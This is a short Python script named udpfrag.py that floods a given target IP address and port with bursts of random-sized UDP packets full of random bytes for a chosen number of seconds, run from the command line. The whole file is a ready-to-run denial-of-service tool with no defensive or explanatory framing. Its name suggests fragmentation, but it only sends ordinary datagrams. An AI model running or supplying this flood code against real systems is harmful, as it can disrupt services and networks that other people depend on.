# udpfrag.py
import socket
import random
import sys
import time

def udpfrag_flood(target_ip, target_port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    timeout = time.time() + duration
    while time.time() < timeout:
        frag_count = random.randint(5, 20)
        for i in range(frag_count):
            frag_size = random.randint(8, 1500)
            fragment = random._urandom(frag_size)
            sock.sendto(fragment, (target_ip, target_port))
        time.sleep(0.001)
    
    sock.close()

if __name__ == "__main__":
    if len(sys.argv) != 4:
        sys.exit(1)
    udpfrag_flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
